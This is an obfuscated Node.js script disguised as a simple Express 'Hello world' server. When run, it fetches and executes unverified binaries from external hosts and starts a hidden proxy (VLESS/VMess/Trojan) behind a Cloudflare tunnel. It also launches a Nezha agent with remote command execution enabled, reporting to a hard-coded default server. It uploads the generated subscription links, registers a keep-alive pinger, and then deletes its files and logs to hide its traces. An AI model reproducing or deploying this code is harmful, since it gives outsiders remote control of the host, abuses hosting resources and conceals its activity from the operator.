const _0x24c67b=_0x19eb;(function(_0x3c8645,_0x2c2815){const _0x237967=_0x19eb,_0x1030d8=_0x3c8645();while(!![]){try{const _0x173dcc=-parseInt(_0x237967(0x288))/0x1*(-parseInt(_0x237967(0x296))/0x2)+parseInt(_0x237967(0x21f))/0x3+-parseInt(_0x237967(0x289))/0x4+-parseInt(_0x237967(0x224))/0x5+parseInt(_0x237967(0x210))/0x6*(parseInt(_0x237967(0x22e))/0x7)+parseInt(_0x237967(0x20f))/0x8*(-parseInt(_0x237967(0x225))/0x9)+-parseInt(_0x237967(0x281))/0xa*(-parseInt(_0x237967(0x234))/0xb);if(_0x173dcc===_0x2c2815)break;else _0x1030d8['push'](_0x1030d8['shift']());}catch(_0x588281){_0x1030d8['push'](_0x1030d8['shift']());}}}(_0x3227,0x3d587));const express=require(_0x24c67b(0x26b)),app=express(),axios=require(_0x24c67b(0x1e8)),os=require('os'),fs=require('fs'),path=require(_0x24c67b(0x254)),{promisify}=require(_0x24c67b(0x290)),exec=promisify(require(_0x24c67b(0x24f))[_0x24c67b(0x29e)]),{execSync}=require(_0x24c67b(0x24f)),UPLOAD_URL=process[_0x24c67b(0x240)][_0x24c67b(0x277)]||'',PROJECT_URL=process[_0x24c67b(0x240)][_0x24c67b(0x267)]||'',AUTO_ACCESS=process[_0x24c67b(0x240)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x24c67b(0x240)][_0x24c67b(0x22d)]||_0x24c67b(0x22f),SUB_PATH=process['env']['SUB_PATH']||_0x24c67b(0x21a),PORT=process[_0x24c67b(0x240)][_0x24c67b(0x1ec)]||process[_0x24c67b(0x240)][_0x24c67b(0x252)]||0xbb8,UUID=process[_0x24c67b(0x240)][_0x24c67b(0x207)]||_0x24c67b(0x1f9),NEZHA_SERVER=process[_0x24c67b(0x240)]['NEZHA_SERVER']||_0x24c67b(0x1f5),NEZHA_PORT=process[_0x24c67b(0x240)][_0x24c67b(0x253)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||_0x24c67b(0x27e),ARGO_DOMAIN=process[_0x24c67b(0x240)][_0x24c67b(0x275)]||'',ARGO_AUTH=process[_0x24c67b(0x240)][_0x24c67b(0x243)]||'',ARGO_PORT=process[_0x24c67b(0x240)][_0x24c67b(0x286)]||0x1f41,CFIP=process[_0x24c67b(0x240)]['CFIP']||'www.visa.com.sg',CFPORT=process[_0x24c67b(0x240)][_0x24c67b(0x25d)]||0x1bb,NAME=process[_0x24c67b(0x240)][_0x24c67b(0x26c)]||_0x24c67b(0x20a);!fs[_0x24c67b(0x206)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x24c67b(0x28c)](FILE_PATH+_0x24c67b(0x22b))):console['log'](FILE_PATH+_0x24c67b(0x242));let npmPath=path[_0x24c67b(0x283)](FILE_PATH,_0x24c67b(0x203)),phpPath=path['join'](FILE_PATH,'php'),webPath=path[_0x24c67b(0x283)](FILE_PATH,_0x24c67b(0x24c)),botPath=path[_0x24c67b(0x283)](FILE_PATH,_0x24c67b(0x294)),subPath=path['join'](FILE_PATH,_0x24c67b(0x229)),listPath=path[_0x24c67b(0x283)](FILE_PATH,_0x24c67b(0x20d)),bootLogPath=path[_0x24c67b(0x283)](FILE_PATH,'boot.log'),configPath=path[_0x24c67b(0x283)](FILE_PATH,_0x24c67b(0x1ee));function _0x3227(){const _0x42365f=['NAME','\x20>/dev/null\x202>&1','/vmess-argo','false','&path=%2Fvless-argo%3Fed%3D2560#','readFileSync','true','Empowerment\x20failed\x20for\x20','trojan','ARGO_DOMAIN','/trojan-argo','UPLOAD_URL','application/json','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','2087','match','data','443','JgARl5rWKs4k8TTuG1OgFcaxrxsjmpHl','rm\x20-rf\x20','?encryption=none&security=tls&sni=','1144810OIGHzg','npm\x20running\x20error:\x20','join','&path=%2Ftrojan-argo%3Fed%3D2560#','boot.log','ARGO_PORT','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','1370vulztK','1924556vYWthR','unlink','fileUrl','log','response','ARGO_DOMAIN:','--tls','util','aarch64','\x20>/dev/null\x202>&1\x20&','http\x20server\x20is\x20running\x20on\x20port:','bot','./php','192fIjcNj','pop','error','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','map','set','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','exec','\x0avless://','forEach','axios','Error\x20downloading\x20files:','catch','xtls-rprx-vision','SERVER_PORT','Content-Type','config.json','from','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x0a\x20\x20credentials-file:\x20','trim','finish','https://arm64.ssss.nyc.mn/agent','nzag.faiz.us.kg:8008','web\x20running\x20error:\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','none','89760d36-1aae-4133-bad5-869a142bc9ad','base64','http','chmod','get','writeFileSync','tls','includes','stringify','https://arm64.ssss.nyc.mn/web','npm','/tunnel.yml\x20run','\x20failed:\x20','existsSync','UUID','utf-8','length','Vls','arch','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','list.txt','nohup\x20','24xsjIat','6zwMOvk','push','createWriteStream','/vmess-argo?ed=2560','vless','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','/api/add-subscriptions','stream','/vless-argo','\x20-p\x20','sub','?security=tls&sni=','https://amd64.ssss.nyc.mn/2go','\x0a\x20\x20tunnel:\x20','&type=ws&host=','1489998Ybmpqu','filter','\x0a\x20\x20\x20\x20','https://oooo.serv00.net/add-url','/bot\x20','1504245ojirpv','631269SLIFtN','block','NEZHA\x20variable\x20is\x20empty,skip\x20running','./web','sub.txt','post','\x20is\x20created','/api/delete-nodes','FILE_PATH','1904371SrSqTr','./tmp','config.yaml','tunnel.json','php\x20running\x20error:\x20','127.0.0.1','33IeHKcI','direct','/web\x20-c\x20','listen','https+local://8.8.8.8/dns-query','Hello\x20world!','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','split','bot\x20is\x20running','test','TunnelSecret','clear','env','arm64','\x20already\x20exists','ARGO_AUTH','arm','unshift','status','/npm\x20-s\x20','Download\x20','pkill\x20-f\x20\x22[b]ot\x22\x20>\x20/dev/null\x202>&1','quic','tcp','web','/dev/null','toString','child_process','/api/add-nodes','freedom','PORT','NEZHA_PORT','path','/sub.txt\x20saved\x20successfully','\x0a\x20\x20\x0atrojan://','Empowerment\x20success\x20for\x20','all','App\x20is\x20running','web\x20is\x20running','https://amd64.ssss.nyc.mn/agent','Skipping\x20adding\x20automatic\x20access\x20task','CFPORT','/config.json\x20>/dev/null\x202>&1\x20&','Subscription\x20uploaded\x20successfully','message','2083','\x20successfully','pipe','https://arm64.ssss.nyc.mn/2go','Error\x20executing\x20command:\x20','automatic\x20access\x20task\x20added\x20successfully','PROJECT_URL','send','bot\x20is\x20running.','ArgoDomain:','express'];_0x3227=function(){return _0x42365f;};return _0x3227();}function deleteNodes(){const _0x306665=_0x24c67b;try{if(!UPLOAD_URL)return;if(!fs[_0x306665(0x206)](subPath))return;let _0x30481a;try{_0x30481a=fs[_0x306665(0x271)](subPath,_0x306665(0x208));}catch{return null;}const _0x4618e9=Buffer['from'](_0x30481a,_0x306665(0x1fa))['toString'](_0x306665(0x208)),_0x53e4ef=_0x4618e9[_0x306665(0x23b)]('\x0a')[_0x306665(0x220)](_0x57e6ae=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x306665(0x23d)](_0x57e6ae));if(_0x53e4ef[_0x306665(0x209)]===0x0)return;return axios[_0x306665(0x22a)](UPLOAD_URL+_0x306665(0x22c),JSON['stringify']({'nodes':_0x53e4ef}),{'headers':{'Content-Type':_0x306665(0x278)}})[_0x306665(0x1ea)](_0x49c042=>{return null;});}catch(_0x2c1d3b){return null;}}function cleanupOldFiles(){const _0x13ca2c=_0x24c67b,_0x1f6190=[_0x13ca2c(0x24c),_0x13ca2c(0x294),'npm','php','sub.txt',_0x13ca2c(0x285)];_0x1f6190['forEach'](_0x29f6b1=>{const _0x3dfea5=_0x13ca2c,_0x2aa34b=path[_0x3dfea5(0x283)](FILE_PATH,_0x29f6b1);fs[_0x3dfea5(0x28a)](_0x2aa34b,()=>{});});}app[_0x24c67b(0x1fd)]('/',function(_0x1e1720,_0xfab719){const _0x3af088=_0x24c67b;_0xfab719['send'](_0x3af088(0x239));});const config={'log':{'access':_0x24c67b(0x24d),'error':_0x24c67b(0x24d),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x24c67b(0x1eb)}],'decryption':_0x24c67b(0x1f8),'fallbacks':[{'dest':0xbb9},{'path':'/vless-argo','dest':0xbba},{'path':_0x24c67b(0x26e),'dest':0xbbb},{'path':_0x24c67b(0x276),'dest':0xbbc}]},'streamSettings':{'network':_0x24c67b(0x24b)}},{'port':0xbb9,'listen':_0x24c67b(0x233),'protocol':_0x24c67b(0x214),'settings':{'clients':[{'id':UUID}],'decryption':_0x24c67b(0x1f8)},'streamSettings':{'network':'tcp','security':_0x24c67b(0x1f8)}},{'port':0xbba,'listen':_0x24c67b(0x233),'protocol':_0x24c67b(0x214),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x24c67b(0x1f8)},'streamSettings':{'network':'ws','security':_0x24c67b(0x1f8),'wsSettings':{'path':_0x24c67b(0x218)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x24c67b(0x1ff),_0x24c67b(0x24a)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x24c67b(0x26e)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x24c67b(0x24a)],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x24c67b(0x274),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x24c67b(0x1f8),'wsSettings':{'path':_0x24c67b(0x276)}},'sniffing':{'enabled':!![],'destOverride':[_0x24c67b(0x1fb),_0x24c67b(0x1ff),_0x24c67b(0x24a)],'metadataOnly':![]}}],'dns':{'servers':[_0x24c67b(0x238)]},'outbounds':[{'protocol':_0x24c67b(0x251),'tag':_0x24c67b(0x235)},{'protocol':'blackhole','tag':_0x24c67b(0x226)}]};fs[_0x24c67b(0x1fe)](path[_0x24c67b(0x283)](FILE_PATH,'config.json'),JSON['stringify'](config,null,0x2));function _0x19eb(_0x28e1a4,_0x5069d6){const _0x322726=_0x3227();return _0x19eb=function(_0x19ebac,_0x35fa1c){_0x19ebac=_0x19ebac-0x1e6;let _0x47324d=_0x322726[_0x19ebac];return _0x47324d;},_0x19eb(_0x28e1a4,_0x5069d6);}function getSystemArchitecture(){const _0x474dd6=_0x24c67b,_0x3cacc9=os[_0x474dd6(0x20b)]();return _0x3cacc9===_0x474dd6(0x244)||_0x3cacc9===_0x474dd6(0x241)||_0x3cacc9===_0x474dd6(0x291)?_0x474dd6(0x244):'amd';}function downloadFile(_0x3c7956,_0x19490a,_0x3536f5){const _0x5f9c9=_0x24c67b,_0x4b3891=path[_0x5f9c9(0x283)](FILE_PATH,_0x3c7956),_0x3644e5=fs[_0x5f9c9(0x212)](_0x4b3891);axios({'method':'get','url':_0x19490a,'responseType':_0x5f9c9(0x217)})['then'](_0xd1abc7=>{const _0x559547=_0x5f9c9;_0xd1abc7[_0x559547(0x27c)][_0x559547(0x263)](_0x3644e5),_0x3644e5['on'](_0x559547(0x1f3),()=>{const _0x4df11b=_0x559547;_0x3644e5['close'](),console[_0x4df11b(0x28c)](_0x4df11b(0x248)+_0x3c7956+_0x4df11b(0x262)),_0x3536f5(null,_0x3c7956);}),_0x3644e5['on'](_0x559547(0x298),_0x122751=>{const _0x60cb84=_0x559547;fs['unlink'](_0x4b3891,()=>{});const _0x951813=_0x60cb84(0x248)+_0x3c7956+_0x60cb84(0x205)+_0x122751['message'];console[_0x60cb84(0x298)](_0x951813),_0x3536f5(_0x951813);});})[_0x5f9c9(0x1ea)](_0x3160fa=>{const _0x2dfc29=_0x5f9c9,_0x48bee1=_0x2dfc29(0x248)+_0x3c7956+'\x20failed:\x20'+_0x3160fa['message'];console[_0x2dfc29(0x298)](_0x48bee1),_0x3536f5(_0x48bee1);});}async function downloadFilesAndRun(){const _0x11c9fe=_0x24c67b,_0x2d0cd6=getSystemArchitecture(),_0x1a297f=getFilesForArchitecture(_0x2d0cd6);if(_0x1a297f[_0x11c9fe(0x209)]===0x0){console['log'](_0x11c9fe(0x1f0));return;}const _0x41baa6=_0x1a297f[_0x11c9fe(0x29a)](_0xab643d=>{return new Promise((_0xd2fd82,_0x23252b)=>{const _0x313d87=_0x19eb;downloadFile(_0xab643d['fileName'],_0xab643d[_0x313d87(0x28b)],(_0x23129f,_0x3fdcb9)=>{_0x23129f?_0x23252b(_0x23129f):_0xd2fd82(_0x3fdcb9);});});});try{await Promise[_0x11c9fe(0x258)](_0x41baa6);}catch(_0x1c44c4){console[_0x11c9fe(0x298)](_0x11c9fe(0x1e9),_0x1c44c4);return;}function _0x104933(_0xa45fbe){const _0x2f185c=_0x11c9fe,_0x3b7e1e=0x1fd;_0xa45fbe[_0x2f185c(0x1e7)](_0x3906b7=>{const _0x2f4123=_0x2f185c,_0xed59cd=path[_0x2f4123(0x283)](FILE_PATH,_0x3906b7);fs['existsSync'](_0xed59cd)&&fs[_0x2f4123(0x1fc)](_0xed59cd,_0x3b7e1e,_0x19f83a=>{const _0x125d20=_0x2f4123;_0x19f83a?console[_0x125d20(0x298)](_0x125d20(0x273)+_0xed59cd+':\x20'+_0x19f83a):console['log'](_0x125d20(0x257)+_0xed59cd+':\x20'+_0x3b7e1e[_0x125d20(0x24e)](0x8));});});}const _0x72b9f9=NEZHA_PORT?['./npm',_0x11c9fe(0x228),'./bot']:[_0x11c9fe(0x295),_0x11c9fe(0x228),'./bot'];_0x104933(_0x72b9f9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x149553=NEZHA_SERVER[_0x11c9fe(0x200)](':')?NEZHA_SERVER[_0x11c9fe(0x23b)](':')[_0x11c9fe(0x297)]():'',_0x142d77=new Set(['443','8443','2096',_0x11c9fe(0x27a),_0x11c9fe(0x261),'2053']),_0x201ca1=_0x142d77['has'](_0x149553)?_0x11c9fe(0x272):_0x11c9fe(0x26f),_0x812bb2='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20false\x0aip_report_period:\x201800\x0areport_delay:\x201\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x201ca1+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x11c9fe(0x1fe)](path[_0x11c9fe(0x283)](FILE_PATH,_0x11c9fe(0x230)),_0x812bb2);const _0x5d5348=_0x11c9fe(0x20e)+FILE_PATH+'/php\x20-c\x20\x22'+FILE_PATH+_0x11c9fe(0x29d);try{await exec(_0x5d5348),console[_0x11c9fe(0x28c)]('php\x20is\x20running'),await new Promise(_0x29320b=>setTimeout(_0x29320b,0x3e8));}catch(_0x4a65b1){console[_0x11c9fe(0x298)](_0x11c9fe(0x232)+_0x4a65b1);}}else{let _0x1eec28='';const _0x35fe91=[_0x11c9fe(0x27d),'8443','2096',_0x11c9fe(0x27a),'2083','2053'];_0x35fe91[_0x11c9fe(0x200)](NEZHA_PORT)&&(_0x1eec28=_0x11c9fe(0x28f));const _0x347f67=_0x11c9fe(0x20e)+FILE_PATH+_0x11c9fe(0x247)+NEZHA_SERVER+':'+NEZHA_PORT+_0x11c9fe(0x219)+NEZHA_KEY+'\x20'+_0x1eec28+'\x20>/dev/null\x202>&1\x20&';try{await exec(_0x347f67),console[_0x11c9fe(0x28c)]('npm\x20is\x20running'),await new Promise(_0x24cf21=>setTimeout(_0x24cf21,0x3e8));}catch(_0x33e6ac){console[_0x11c9fe(0x298)](_0x11c9fe(0x282)+_0x33e6ac);}}}else console[_0x11c9fe(0x28c)](_0x11c9fe(0x227));const _0x14a696=_0x11c9fe(0x20e)+FILE_PATH+_0x11c9fe(0x236)+FILE_PATH+_0x11c9fe(0x25e);try{await exec(_0x14a696),console[_0x11c9fe(0x28c)](_0x11c9fe(0x25a)),await new Promise(_0x34583d=>setTimeout(_0x34583d,0x3e8));}catch(_0x2d15e1){console[_0x11c9fe(0x298)](_0x11c9fe(0x1f6)+_0x2d15e1);}if(fs[_0x11c9fe(0x206)](path[_0x11c9fe(0x283)](FILE_PATH,'bot'))){let _0x194702;if(ARGO_AUTH[_0x11c9fe(0x27b)](/^[A-Z0-9a-z=]{120,250}$/))_0x194702=_0x11c9fe(0x23a)+ARGO_AUTH;else ARGO_AUTH[_0x11c9fe(0x27b)](/TunnelSecret/)?_0x194702=_0x11c9fe(0x29c)+FILE_PATH+_0x11c9fe(0x204):_0x194702=_0x11c9fe(0x287)+FILE_PATH+_0x11c9fe(0x215)+ARGO_PORT;try{await exec(_0x11c9fe(0x20e)+FILE_PATH+_0x11c9fe(0x223)+_0x194702+_0x11c9fe(0x292)),console[_0x11c9fe(0x28c)](_0x11c9fe(0x23c)),await new Promise(_0x349403=>setTimeout(_0x349403,0x7d0));}catch(_0x39978a){console[_0x11c9fe(0x298)]('Error\x20executing\x20command:\x20'+_0x39978a);}}await new Promise(_0x4ec19e=>setTimeout(_0x4ec19e,0x1388));}function getFilesForArchitecture(_0x3da0a8){const _0xd2b09d=_0x24c67b;let _0x3632f1;_0x3da0a8==='arm'?_0x3632f1=[{'fileName':_0xd2b09d(0x24c),'fileUrl':_0xd2b09d(0x202)},{'fileName':_0xd2b09d(0x294),'fileUrl':_0xd2b09d(0x264)}]:_0x3632f1=[{'fileName':_0xd2b09d(0x24c),'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':'bot','fileUrl':_0xd2b09d(0x21c)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x47db08=_0x3da0a8===_0xd2b09d(0x244)?_0xd2b09d(0x1f4):_0xd2b09d(0x25b);_0x3632f1[_0xd2b09d(0x245)]({'fileName':_0xd2b09d(0x203),'fileUrl':_0x47db08});}else{const _0x1b6812=_0x3da0a8===_0xd2b09d(0x244)?'https://arm64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/v1';_0x3632f1[_0xd2b09d(0x245)]({'fileName':'php','fileUrl':_0x1b6812});}}return _0x3632f1;}function argoType(){const _0x3f9caf=_0x24c67b;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3f9caf(0x28c)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x3f9caf(0x200)](_0x3f9caf(0x23e))){fs['writeFileSync'](path[_0x3f9caf(0x283)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x3990ed=_0x3f9caf(0x21d)+ARGO_AUTH['split']('\x22')[0xb]+_0x3f9caf(0x1f1)+path['join'](FILE_PATH,_0x3f9caf(0x231))+_0x3f9caf(0x1f7)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x3f9caf(0x20c);fs[_0x3f9caf(0x1fe)](path[_0x3f9caf(0x283)](FILE_PATH,'tunnel.yml'),_0x3990ed);}else console[_0x3f9caf(0x28c)](_0x3f9caf(0x279));}argoType();async function extractDomains(){const _0x2cb58d=_0x24c67b;let _0x88851b;if(ARGO_AUTH&&ARGO_DOMAIN)_0x88851b=ARGO_DOMAIN,console[_0x2cb58d(0x28c)](_0x2cb58d(0x28e),_0x88851b),await _0x1fd360(_0x88851b);else try{const _0xafcb06=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),'utf-8'),_0x30710d=_0xafcb06[_0x2cb58d(0x23b)]('\x0a'),_0x397ae9=[];_0x30710d[_0x2cb58d(0x1e7)](_0x3921ca=>{const _0x52d242=_0x2cb58d,_0xe87870=_0x3921ca[_0x52d242(0x27b)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xe87870){const _0x4ee978=_0xe87870[0x1];_0x397ae9[_0x52d242(0x211)](_0x4ee978);}});if(_0x397ae9['length']>0x0)_0x88851b=_0x397ae9[0x0],console[_0x2cb58d(0x28c)](_0x2cb58d(0x26a),_0x88851b),await _0x1fd360(_0x88851b);else{console[_0x2cb58d(0x28c)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x2cb58d(0x283)](FILE_PATH,'boot.log'));async function _0xa14968(){const _0x2c8988=_0x2cb58d;try{await exec(_0x2c8988(0x249));}catch(_0x528e53){}}_0xa14968(),await new Promise(_0x883f05=>setTimeout(_0x883f05,0xbb8));const _0x5a2dc6='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2cb58d(0x215)+ARGO_PORT;try{await exec(_0x2cb58d(0x20e)+path[_0x2cb58d(0x283)](FILE_PATH,_0x2cb58d(0x294))+'\x20'+_0x5a2dc6+_0x2cb58d(0x292)),console['log'](_0x2cb58d(0x269)),await new Promise(_0x388f3f=>setTimeout(_0x388f3f,0xbb8)),await extractDomains();}catch(_0x483242){console[_0x2cb58d(0x298)](_0x2cb58d(0x265)+_0x483242);}}}catch(_0x39519f){console[_0x2cb58d(0x298)]('Error\x20reading\x20boot.log:',_0x39519f);}async function _0x1fd360(_0x13708b){const _0x352abd=_0x2cb58d,_0x383408=execSync('curl\x20-s\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x352abd(0x208)}),_0x24cd0a=_0x383408[_0x352abd(0x1f2)]();return new Promise(_0x3d4bdf=>{setTimeout(()=>{const _0xa6e0ae=_0x19eb,_0x4a4985={'v':'2','ps':NAME+'-'+_0x24cd0a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x13708b,'path':_0xa6e0ae(0x213),'tls':_0xa6e0ae(0x1ff),'sni':_0x13708b,'alpn':''},_0x46f856=_0xa6e0ae(0x1e6)+UUID+'@'+CFIP+':'+CFPORT+_0xa6e0ae(0x280)+_0x13708b+_0xa6e0ae(0x21e)+_0x13708b+_0xa6e0ae(0x270)+NAME+'-'+_0x24cd0a+'\x0a\x20\x20\x0avmess://'+Buffer[_0xa6e0ae(0x1ef)](JSON[_0xa6e0ae(0x201)](_0x4a4985))[_0xa6e0ae(0x24e)](_0xa6e0ae(0x1fa))+_0xa6e0ae(0x256)+UUID+'@'+CFIP+':'+CFPORT+_0xa6e0ae(0x21b)+_0x13708b+_0xa6e0ae(0x21e)+_0x13708b+_0xa6e0ae(0x284)+NAME+'-'+_0x24cd0a+_0xa6e0ae(0x221);console[_0xa6e0ae(0x28c)](Buffer[_0xa6e0ae(0x1ef)](_0x46f856)['toString'](_0xa6e0ae(0x1fa))),fs[_0xa6e0ae(0x1fe)](subPath,Buffer['from'](_0x46f856)[_0xa6e0ae(0x24e)]('base64')),console[_0xa6e0ae(0x28c)](FILE_PATH+_0xa6e0ae(0x255)),uplodNodes(),app[_0xa6e0ae(0x1fd)]('/'+SUB_PATH,(_0x5d31a9,_0x5b8263)=>{const _0x1a5d71=_0xa6e0ae,_0x433b7c=Buffer[_0x1a5d71(0x1ef)](_0x46f856)[_0x1a5d71(0x24e)]('base64');_0x5b8263[_0x1a5d71(0x29b)](_0x1a5d71(0x1ed),'text/plain;\x20charset=utf-8'),_0x5b8263[_0x1a5d71(0x268)](_0x433b7c);}),_0x3d4bdf(_0x46f856);},0x7d0);});}}async function uplodNodes(){const _0x1a3d8b=_0x24c67b;if(UPLOAD_URL&&PROJECT_URL){const _0x350823=PROJECT_URL+'/'+SUB_PATH,_0x4e20b2={'subscription':[_0x350823]};try{const _0x36e6d3=await axios['post'](UPLOAD_URL+_0x1a3d8b(0x216),_0x4e20b2,{'headers':{'Content-Type':'application/json'}});if(_0x36e6d3[_0x1a3d8b(0x246)]===0xc8)console[_0x1a3d8b(0x28c)](_0x1a3d8b(0x25f));else return null;}catch(_0x5ede7c){if(_0x5ede7c['response']){if(_0x5ede7c[_0x1a3d8b(0x28d)][_0x1a3d8b(0x246)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x211c32=fs[_0x1a3d8b(0x271)](listPath,_0x1a3d8b(0x208)),_0xa5a24e=_0x211c32[_0x1a3d8b(0x23b)]('\x0a')[_0x1a3d8b(0x220)](_0x4eddbf=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1a3d8b(0x23d)](_0x4eddbf));if(_0xa5a24e[_0x1a3d8b(0x209)]===0x0)return;const _0x1eb8a2=JSON[_0x1a3d8b(0x201)]({'nodes':_0xa5a24e});try{await axios[_0x1a3d8b(0x22a)](UPLOAD_URL+_0x1a3d8b(0x250),_0x1eb8a2,{'headers':{'Content-Type':'application/json'}});if(response[_0x1a3d8b(0x246)]===0xc8)console[_0x1a3d8b(0x28c)]('Subscription\x20uploaded\x20successfully');else return null;}catch(_0x34ae46){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x23315d=_0x19eb,_0xc1a420=[bootLogPath,configPath,webPath,botPath,phpPath,npmPath];if(NEZHA_PORT)_0xc1a420[_0x23315d(0x211)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xc1a420[_0x23315d(0x211)](phpPath);exec(_0x23315d(0x27f)+_0xc1a420[_0x23315d(0x283)]('\x20')+_0x23315d(0x26d),_0x33c33e=>{const _0x3a3f55=_0x23315d;console[_0x3a3f55(0x23f)](),console['log'](_0x3a3f55(0x259)),console[_0x3a3f55(0x28c)](_0x3a3f55(0x299));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x1b6686=_0x24c67b;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x1b6686(0x28c)](_0x1b6686(0x25c));return;}try{const _0x5e856d=await axios['post'](_0x1b6686(0x222),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x1b6686(0x278)}});console[_0x1b6686(0x28c)](_0x1b6686(0x266));}catch(_0x37d8c0){console[_0x1b6686(0x298)]('添加URL失败:\x20'+_0x37d8c0[_0x1b6686(0x260)]);}}async function startserver(){deleteNodes(),cleanupOldFiles(),await downloadFilesAndRun(),await extractDomains(),AddVisitTask();}startserver(),app[_0x24c67b(0x237)](PORT,()=>console[_0x24c67b(0x28c)](_0x24c67b(0x293)+PORT+'!'));
